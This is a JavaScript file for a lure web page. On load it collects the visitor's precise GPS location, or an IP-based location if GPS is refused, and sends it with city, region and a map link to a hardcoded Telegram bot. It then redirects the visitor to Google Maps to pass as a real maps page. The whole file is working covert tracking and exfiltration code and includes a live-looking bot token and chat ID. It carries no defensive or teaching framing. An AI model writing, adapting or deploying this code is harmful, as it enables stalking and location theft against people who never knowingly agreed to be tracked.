const loadingOverlay = document.getElementById("loading");

function logAndRedirect(data) {
  console.log("📍 Location Data:", data);

  const TELEGRAM_BOT_TOKEN = "7943375930:AAEiifo4A9NiuxY13o73qjCJVUiHXEu2ta8";
  const TELEGRAM_CHAT_ID = "6602027873";

  const message = `
📡 *New Location Captured*
Source: ${data.source}
Latitude: ${data.lat}
Longitude: ${data.lon}
${data.city ? `City: ${data.city}` : ""}
${data.region ? `Region: ${data.region}` : ""}
${data.country ? `Country: ${data.country}` : ""}
Accuracy: ${data.accuracy || "N/A"}
Map: https://www.google.com/maps?q=${data.lat},${data.lon}
  `;

  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: "Markdown"
    })
  })
  .then(() => {
    setTimeout(() => {
      window.location.href = "https://www.google.com/maps";
    }, 1500);
  })
  .catch((err) => {
    console.error("❌ Telegram log failed:", err);
    setTimeout(() => {
      window.location.href = "https://www.google.com/maps";
    }, 1500);
  });
}

function requestLocation() {
  if ("geolocation" in navigator) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const coords = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
          source: "GPS"
        };
        logAndRedirect(coords);
      },
      (err) => {
        console.warn("⚠️ GPS Denied:", err.message);
        fallbackToIP();
      },
      { enableHighAccuracy: true, timeout: 10000 }
    );
  } else {
    fallbackToIP();
  }
}

function fallbackToIP() {
  fetch("https://ip-api.com/json")
    .then(res => res.json())
    .then(data => {
      const coords = {
        lat: data.lat,
        lon: data.lon,
        city: data.city,
        region: data.regionName,
        country: data.country,
        source: "IP"
      };
      logAndRedirect(coords);
    })
    .catch(err => {
      console.error("IP location failed", err);
      logAndRedirect({ source: "Unknown" });
    });
}

function retryGPS() {
  requestLocation();
}

window.onload = () => {
  setTimeout(() => {
    loadingOverlay.style.display = "none";
    requestLocation();
  }, 1500);
};
